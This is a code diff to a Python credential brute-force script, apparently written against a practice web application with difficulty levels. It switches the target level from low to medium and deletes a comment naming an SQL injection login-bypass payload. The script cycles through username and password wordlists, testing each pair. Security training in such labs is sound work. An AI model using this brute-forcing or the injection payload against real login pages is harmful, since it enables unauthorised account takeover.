@@ -5,16 +5,14 @@ import requests
 from conf import BASE_URL
 from util import http_get
 
-# We can also use the SQLi with the payload "' OR 1=1 LIMIT 1 --"
-
 USERNAME_WORDLISTS = "./src/bruteforce/username.txt"
 PASSWORD_WORDLISTS = "./src/bruteforce/passwords.txt"
 
-DIFFICULTY = "low"
+DIFFICULTY = "medium"
 
 # -----------------------
 
-def bruteforce_low():
+def bruteforce_medium():
     global USERNAME_WORDLISTS, PASSWORD_WORDLISTS
     
     usernames = get_wordlist(USERNAME_WORDLISTS)
@@ -27,7 +25,7 @@ def bruteforce_low():
         for password in passwords:
             print(f"[INFO]: Testing: ({user}:{password})")
             if check_credentials(user, password):
-                print(f"[INFO]: Found credentials: ({user}:{password})")
+                print(f"[INFO]: Found credentials: ({user}:{password})!")
                 break
 
 # -----------------------
